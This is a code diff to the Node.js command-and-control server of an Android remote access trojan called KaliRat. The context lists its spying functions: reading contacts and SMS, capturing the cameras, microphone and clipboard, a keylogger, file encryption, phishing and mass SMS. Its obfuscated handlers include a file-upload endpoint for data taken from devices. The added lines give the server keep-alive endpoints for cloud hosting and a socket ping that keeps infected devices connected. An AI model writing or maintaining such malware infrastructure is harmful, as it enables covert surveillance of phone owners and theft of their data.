@@ -51,6 +51,61 @@ figlet('KaliRat', function(err, data) {
 
 const appData = new Map();
 const actions = ["Contacts", "SMS", "Calls", "Apps", "Main camera", "Selfie Camera", "Microphone", "Clipboard", "Screenshot", "Toast", "Send SMS", "Vibrate", "Play audio", "Stop Audio", "Keylogger ON", "Keylogger OFF", "File explorer", "Gallery", "Encrypt", "Decrypt", "Send SMS to all contacts", "Pop notification", "Open URL ", "Phishing", "Back to main menu"];
+
+// ===========================================
+// Health Check & Keep-Alive Endpoints
+// ===========================================
+
+// Health check endpoint for Render.com
+app.get("/health", (_req, res) => {
+  res.status(200).json({
+    status: "ok",
+    uptime: process.uptime(),
+    timestamp: new Date().toISOString(),
+    connections: io.sockets.sockets.size
+  });
+});
+
+// Root endpoint
+app.get("/", (_req, res) => {
+  res.status(200).json({
+    name: "KaliRat Bot",
+    status: "running",
+    version: "1.0.0"
+  });
+});
+
+// Keep-alive endpoint
+app.get("/ping", (_req, res) => {
+  res.status(200).send("pong");
+});
+
+// ===========================================
+// Self Keep-Alive Function
+// ===========================================
+const KEEP_ALIVE_INTERVAL = parseInt(process.env.KEEP_ALIVE_INTERVAL) || 840000; // 14 minutes default
+
+function keepAlive() {
+  const hostUrl = process.env.HOST_URL;
+  if (hostUrl) {
+    const url = hostUrl.endsWith('/') ? hostUrl : hostUrl + '/';
+    https.get(url + 'ping', (res) => {
+      console.log(`[Keep-Alive] Ping sent - Status: ${res.statusCode}`);
+    }).on('error', (err) => {
+      console.log(`[Keep-Alive] Ping failed: ${err.message}`);
+    });
+  }
+}
+
+// Start keep-alive if HOST_URL is set
+if (process.env.HOST_URL) {
+  setInterval(keepAlive, KEEP_ALIVE_INTERVAL);
+  console.log(`[Keep-Alive] Started - Interval: ${KEEP_ALIVE_INTERVAL / 1000}s`);
+}
+
+// ===========================================
+// File Upload Endpoint
+// ===========================================
 app.post("/upload", uploader.single('file'), (_0xe7d0f6, _0x30973d) => {
   const _0x1763f6 = _0xe7d0f6.file.originalname;
   const _0x3abcf4 = _0xe7d0f6.headers.model;
@@ -747,14 +802,23 @@ bot.on("message", _0xdbde0c => {
     }
   }
 });
+// ===========================================
+// Socket Ping (Keep devices connected)
+// ===========================================
 setInterval(() => {
-  io.sockets.sockets.forEach((_0x107f46, _0x316932, _0x1f46f7) => {
-    io.to(_0x316932).emit("ping", {});
+  io.sockets.sockets.forEach((socket, socketId) => {
+    io.to(socketId).emit("ping", {});
   });
-}, 0x1388);
-setInterval(() => {
-  https.get(data.host, _0x9df260 => {}).on("error", _0x26bc04 => {});
-}, 0x75300);
-server.listen(process.env.PORT || 0xbb8, () => {
-  console.log("listening on port 3000");
+}, 5000); // Every 5 seconds
+
+// ===========================================
+// Start Server
+// ===========================================
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+  console.log(`\n[Server] Running on port ${PORT}`);
+  console.log(`[Server] Health check: http://localhost:${PORT}/health`);
+  if (process.env.HOST_URL) {
+    console.log(`[Server] Public URL: ${process.env.HOST_URL}`);
+  }
 });
